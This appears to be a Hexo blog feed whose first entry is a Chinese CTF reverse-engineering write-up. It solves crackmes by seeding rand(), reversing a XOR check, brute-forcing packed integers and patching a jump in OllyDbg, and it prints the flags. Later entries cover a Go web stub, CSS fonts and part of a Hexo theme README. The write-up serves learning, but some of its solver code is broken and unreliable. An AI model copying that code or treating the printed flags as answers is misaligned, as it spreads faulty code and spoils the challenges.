[bp-8h]@1  v11 = *MK_FP(__FS__, 40LL);  v5 = 0LL;  srand(10520);  v6 = rand() % 10520;  v7 = rand() % 10520;  v8 = rand() % 10520;  v9 = rand() % 10520;  v10 = v8 + v7 + v6 + v9;  printf("Input your key:", argv);  __isoc99_scanf("%ld", &amp;v5);  if ( v10 == v5 )    printf("flag{cdusec_wsj_%ld}", v5);  else    printf("wrong!");  result = 0;  v4 = *MK_FP(__FS__, 40LL) ^ v11;  return 0;}</studio.h></code></pre><p>大概就是我们需要输入一个数，并且这个数要等于<strong>v10</strong> 也就是四个随机的数相加</p><p>我们发现<strong>srand()</strong>函数中只有一个参数</p><p>众所周知，当<strong>srand()</strong> 函数里只有一个参数的时候会生成伪随机数</p><p>伪随机数也就是当<strong>srand()</strong>这个函数里的参数确定了以后，生成的随机数将不会发生改变</p><p>知道了这个原理以后，我们编写脚本</p><pre class=" language-lang-c"><code class="language-lang-c">#include<stdio.h>int main(){    int v6,v7,v8,v9;    int result;    srand(10520);    v6 = rand() % 10520;    v7 = rand() % 10520;    v8 = rand() % 10520;    v9 = rand() % 10520;    result=v6+v7+v8+v9;    printf("%ld",result);    return 0}</stdio.h></code></pre><p>值得一提的是这个程序在linux下运行和在windows下运行结果是不一样的</p><p>命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -o flag flag.c./flag</code></pre><p>这也是为什么他叫linux的原因吧</p><p>结果：</p><pre class=" language-lang-txt"><code class="language-lang-txt">23231</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_wsj_23231}</code></pre><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>这道题比较简单直接给了一个可以运行的python文件（python3.x）</p><pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'a= input()a=a.encode()c=''for i in a:    #print(i)    c=c+chr(i^3)#print(c)if(c.encode()==b):    print("youare right:")    print(a)else:    print("wrong!")</code></pre><p>这就简单了，一顿分析之后</p><p>直接修改脚本</p><pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'c=''for i in b:    c=c+chr(i^3)print(c)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_rec2_easy}</code></pre><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>IDA中F5查看伪代码（32位）</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  signed int v3; // esi@1  signed int v4; // ecx@1  int result; // eax@11  char v6; // [sp+8h] [bp-8h]@1  char v7; // [sp+9h] [bp-7h]@4  char v8; // [sp+Ah] [bp-6h]@4  char v9[5]; // [sp+Bh] [bp-5h]@4  v3 = 1;  printf(Format);  scanf(aS, &amp;v6);  v4 = 0;  do  {    if ( v4 % 4 )      goto LABEL_9;    if ( !(v4 / 4) )    {      if ( *(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251 )        goto LABEL_9;LABEL_8:      v3 = 0;      goto LABEL_9;    }    if ( v4 / 4 == 1 &amp;&amp; *(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) != 1701995365 )      goto LABEL_8;LABEL_9:    ++v4;  }  while ( v4 &lt; 8 );  if ( v3 == 1 )  {    printf(aFlagS_1, &amp;v6);    result = system(Command);  }  else  {    printf(aWrongKey);    result = system(Command);c  }  return result;}</code></pre><p>发现flag的前四位要满足</p><pre class=" language-lang-c"><code class="language-lang-c">*(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251</code></pre><p>后四位要满足</p><pre class=" language-lang-c"><code class="language-lang-c">*(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) != 1701995365</code></pre><p>也就是说flag总共有8位</p><p>先来一手猜flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">cdus ecre</code></pre><p>刚好八位（手动斜眼笑）</p><p>成功得到flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}</code></pre><p>开个玩笑，这题还是要写脚本的</p><p>取出表达式</p><pre class=" language-lang-c"><code class="language-lang-c">v1 + (( v2 + ((v3 + (v4 &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251v5 + (( v6 + ((v7 + (v8 &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251</code></pre><pre class=" language-lang-python"><code class="language-lang-python">flag='qwertyuiopasdfghjklzxcvbnm'def run(number):    for a in range flag:        for b in range flag:            for c in range flag:                for d in range flag:                    if ord(a)+ord(b)+ord(c)+ord(d)=number:                        print a+b+c+drun()</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}</code></pre><h2 id="点击1000次"><a href="#点击1000次" class="headerlink" title="点击1000次"></a>点击1000次</h2><p>如果说re里边最难的那一个的话，那应该就是这道题了，出题人给的hint建议是用ollydbg做，没学过，花了半天的时间学了一下，然后开始本题</p><p>题目上写的是点击1000次给一个flag字符，童叟无欺。</p><p>先用IDA 查看伪代码(32位)</p><pre class=" language-lang-c"><code class="language-lang-c">int sub_401277(){  int result; // eax@3  unsigned __int8 *v1; // [sp+0h] [bp-8h]@1  void *lpMem; // [sp+4h] [bp-4h]@1  lpMem = (void *)sub_4015F2(1, ++dword_4A32C0);  v1 = (unsigned __int8 *)sub_40121B((unsigned int)&amp;unk_480B5F);  if ( lpMem )    sub_4015FE(lpMem);  result = sub_4015F8((HWND)0x52010001, 100728832, 8, -1, v1, 0);  if ( v1 )    result = sub_4015FE(v1);  if ( dword_4A32C0 == 1000 )  {    result = sub_401323();    dword_4A32C0 = 0;  }  return result;}</code></pre><p>从代码我们可以猜到</p><pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C0 == 1000</code></pre><p>这个就是判断的条件</p><p>那么这个</p><pre class=" language-lang-c"><code class="language-lang-c">sub_401323()</code></pre><p>是干什么的呢？</p><p>跟进去看看</p><pre class=" language-lang-c"><code class="language-lang-c">int sub_401323(){  int result; // eax@13  char v1; // al@16  void *lpMem; // [sp+4h] [bp-8h]@16  if ( dword_4A32C4 == 1 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 2 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 3 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 4 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 5 )    sub_4015F2(2, 1);  result = dword_4A32C4 &gt; 5 &amp;&amp; dword_4A32C4 &lt; 18;//不难发现这个是判断flag{}括号里的字符数的  if ( result )  {    v1 = sub_4015F2(2, 1);    lpMem = (void *)sub_4015F2(1, v1);    result = sub_4015F2(2, 1);    if ( lpMem )      result = sub_4015FE(lpMem);  }  if ( dword_4A32C4 == 18 )    result = sub_4015F2(2, 1);  if ( dword_4A32C4 &gt; 10 ) //这个函数是把flag给变成*****的    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);  ++dword_4A32C4;  return result;}</code></pre><p>说实话一开始真没看懂，等到我用OD做出</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{55381</code></pre><p>我才知道这个函数是干什么的</p><p>找到函数的判断点后,进入OD调试</p><pre class=" language-lang-txt"><code class="language-lang-txt">text:00401300                 cmp     dword_4A32C0, 3E8h</code></pre><p>看到判断位置，下断点，右键将数值修改为3E7（也就是999），然后在点击一下</p><p>就会出来一个flag字符</p><p>但当字符数达到10个以上的时候flag就会变成<em>*</em></p><p>猜测</p><pre class=" language-lang-c"><code class="language-lang-c">  if ( dword_4A32C4 &gt; 10 ) //这个函数是把flag给变成*****的    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);  ++dword_4A32C4;</code></pre><p>是这个函数的作用，找到汇编代码，把</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jle     loc_40156C</code></pre><p>修改为</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jge     loc_40156C</code></pre><p>也就是把判断条件改为了</p><pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C4 &lt; 10</code></pre><p>因为现在我们的字符数已经大于10了，所以</p><pre class=" language-lang-c"><code class="language-lang-c">result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);</code></pre><p>这个函数就不会在运行</p><p>再按之前的操作走一遍</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{5538189634510}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go-web</title>
      <link href="/2019/11/08/go-web/go-web/"/>
      <url>/2019/11/08/go-web/go-web/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-Go与-Web-应用"><a href="#第一章-Go与-Web-应用" class="headerlink" title="第一章 Go与 Web 应用"></a>第一章 Go与 Web 应用</h1><h2 id="1-1-使用Go-语言构建Web-应用"><a href="#1-1-使用Go-语言构建Web-应用" class="headerlink" title="1.1 使用Go 语言构建Web 应用"></a>1.1 使用Go 语言构建Web 应用</h2><p>​    “为什么要使用Go语言编写web应用”，Go作为一门比较年轻的编程语言，个人认为比较符合现代发展的趋势，它非常适合用来编写那些需要快速运行的服务器端程序。Go语言提供了很多过程式编程语言的特性，其提供了函数式编程方面的特性，以及现代化的包管理系统，垃圾收集特性以及标准库</p><p>​    在大规模的Web应用方面，Go提供了一种不同于现有语言和平台但又切实可行的方案，大规模可扩展的Web应用通常需要具备以下特性：</p><ul><li>可扩展性</li><li>模块化</li><li>可维护性</li><li>高性能</li></ul><h3 id="1-1-1-Go与可扩展Web应用"><a href="#1-1-1-Go与可扩展Web应用" class="headerlink" title="1.1.1 Go与可扩展Web应用"></a>1.1.1 Go与可扩展Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h3 id="1-1-2-Go-与模块化的Web应用"><a href="#1-1-2-Go-与模块化的Web应用" class="headerlink" title="1.1.2 Go 与模块化的Web应用"></a>1.1.2 Go 与模块化的Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h3 id="1-1-3-Go-与可维护的Web应用"><a href="#1-1-3-Go-与可维护的Web应用" class="headerlink" title="1.1.3 Go 与可维护的Web应用"></a>1.1.3 Go 与可维护的Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h3 id="1-1-4-Go与高性能Web应用"><a href="#1-1-4-Go与高性能Web应用" class="headerlink" title="1.1.4 Go与高性能Web应用"></a>1.1.4 Go与高性能Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h2 id="1-2-Web应用工作原理"><a href="#1-2-Web应用工作原理" class="headerlink" title="1.2 Web应用工作原理"></a>1.2 Web应用工作原理</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Go-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
            <tag> web </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS-pingfang</title>
      <link href="/2019/11/08/html/css/css-pingfang/"/>
      <url>/2019/11/08/html/css/css-pingfang/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS常用的苹方字体"><a href="#CSS常用的苹方字体" class="headerlink" title="CSS常用的苹方字体"></a>CSS常用的苹方字体</h1><p>字体对网页的美观性有时候也起着很关键的作用</p><p>以下是从网上收集到的苹果的苹方字体（自用，不可商用，字体有版权！！！）：</p><pre class=" language-lang-css"><code class="language-lang-css">// 苹方-简 常规体font-family: PingFangSC-Regular, sans-serif;// 苹方-简 极细体font-family: PingFangSC-Ultralight, sans-serif;// 苹方-简 细体font-family: PingFangSC-Light, sans-serif;// 苹方-简 纤细体font-family: PingFangSC-Thin, sans-serif;// 苹方-简 中黑体font-family: PingFangSC-Medium, sans-serif;// 苹方-简 中粗体font-family: PingFangSC-Semibold, sans-serif;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客主题之hexo-theme-matery的介绍</title>
      <link href="/2018/09/28/html/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/"/>
      <url>/2018/09/28/html/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/</url>
      
        <content type="html"><![CDATA[<p><a href="README.md">English Document</a> | <a href="https://blinkfox.github.io/" target="_blank" rel="noopener">演示示例</a> | QQ交流群:<code>926552981</code></p><blockquote><p>这是一个采用<code>Material Design</code>和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>当你看到这里的时候，应该已经有一个自己的 <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 博客了。如果还没有的话，不妨使用 Hexo 和 <a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">Markdown</a> 来写博客和文章。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master" target="_blank" rel="noopener">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>Git clone</code> 命令来下载:</p><pre class=" language-lang-bash"><code class="language-lang-bash">git clone https://github.com/blinkfox/hexo-theme-matery.git</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "categories"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: categoriesdate: 2018-09-30 17:25:30type: "categories"layout: "categories"---</code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "tags"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: tagsdate: 2018-09-30 18:23:38type: "tags"layout: "tags"---</code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "about"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: aboutdate: 2018-09-30 17:25:30type: "about"layout: "about"---</code></pre><h3 id="新建友情连接-friends-页（可选的）"><a href="#新建友情连接-friends-页（可选的）" class="headerlink" title="新建友情连接 friends 页（可选的）"></a>新建友情连接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情连接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "friends"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: friendsdate: 2018-12-12 21:25:30type: "friends"layout: "friends"---</code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class=" language-lang-json"><code class="language-lang-json">[{    "avatar": "http://image.luokangyuan.com/1_qq_27922023.jpg",    "name": "码酱",    "introduction": "我不是大佬，只是在追寻大佬的脚步",    "url": "http://luokangyuan.com/",    "title": "前去学习"}, {    "avatar": "http://image.luokangyuan.com/4027734.jpeg",    "name": "闪烁之狐",    "introduction": "编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬",    "url": "https://blinkfox.github.io/",    "title": "前去学习"}, {    "avatar": "http://image.luokangyuan.com/avatar.jpg",    "name": "ja_rome",    "introduction": "平凡的脚步也可以走出伟大的行程",    "url": "ttps://me.csdn.net/jlh912008548",    "title": "前去学习"}]</code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 <a href="https://github.com/ele828/hexo-prism-plugin" target="_blank" rel="noopener">hexo-prism-plugin</a> 的 Hexo 插件来做代码高亮，安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i -S hexo-prism-plugin</code></pre><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">highlight:  enable: falseprism_plugin:  mode: 'preprocess'    # realtime/preprocess  theme: 'tomorrow'  line_number: false    # default false  custom_css:</code></pre><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install hexo-generator-search --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">search:  path: search.xml  field: post</code></pre><h3 id="中文链接转拼音（可选的）"><a href="#中文链接转拼音（可选的）" class="headerlink" title="中文链接转拼音（可选的）"></a>中文链接转拼音（可选的）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i hexo-permalink-pinyin --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">permalink_pinyin:  enable: true  separator: '-' # default: '-'</code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（可选的）"><a href="#文章字数统计插件（可选的）" class="headerlink" title="文章字数统计插件（可选的）"></a>文章字数统计插件（可选的）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i --save hexo-wordcount</code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，激活以下配置项即可：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">wordCount:  enable: false # 将这个值设置为 true 即可.  postWordCount: true  min2read: true  totalCount: true</code></pre><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install hexo-generator-feed --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: ' '  order_by: -date</code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class=" language-lang-html"><code class="language-lang-html"><a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">    <i class="fa fa-github"></i></a></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fa-facebook</code></li><li>Twitter: <code>fa-twitter</code></li><li>Google-plus: <code>fa-google-plus</code></li><li>Linkedin: <code>fa-linkedin</code></li><li>Tumblr: <code>fa-tumblr</code></li><li>Medium: <code>fa-medium</code></li><li>Slack: <code>fa-slack</code></li><li>新浪微博: <code>fa-weibo</code></li><li>微信: <code>fa-wechat</code></li><li>QQ: <code>fa-qq</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>4.7.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，就必须开启音乐的播放配置和音乐数据的文件。</p><p>首先，在你的博客 <code>source</code> 目录下的 <code>_data</code> 目录（没有的话就新建一个）中新建 <code>musics.json</code> 文件，文件内容如下所示：</p><pre class=" language-lang-json"><code class="language-lang-json">[{    "name": "五月雨变奏电音",    "artist": "AnimeVibe",    "url": "http://xxx.com/music1.mp3",    "cover": "http://xxx.com/music-cover1.png"}, {    "name": "Take me hand",    "artist": "DAISHI DANCE,Cecile Corbel",    "url": "/medias/music/music2.mp3",    "cover": "/medias/music/cover2.png"}, {    "name": "Shape of You",    "artist": "J.Fla",    "url": "http://xxx.com/music3.mp3",    "cover": "http://xxx.com/music-cover3.png"}]</code></pre><blockquote><p><strong>注</strong>：以上 JSON 中的属性：<code>name</code>、<code>artist</code>、<code>url</code>、<code>cover</code> 分别表示音乐的名称、作者、音乐文件地址、音乐封面。</p></blockquote><p>然后，在主题的 <code>_config.yml</code> 配置文件中激活配置即可：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml"># 是否在首页显示音乐.music:  enable: true  showTitle: false  title: 听听音乐  fixed: false # 是否开启吸底模式  autoplay: false # 是否自动播放  theme: '#42b983'  loop: 'all' # 音频循环播放, 可选值: 'all', 'one', 'none'  order: 'list' # 音频循环顺序, 可选值: 'list', 'random'  preload: 'auto' # 预加载，可选值: 'none', 'metadata', 'auto'  volume: 0.7 # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效  listFolded: false # 列表默认折叠  listMaxHeight: # 列表最大高度</code></pre><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><div class="table-container"><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 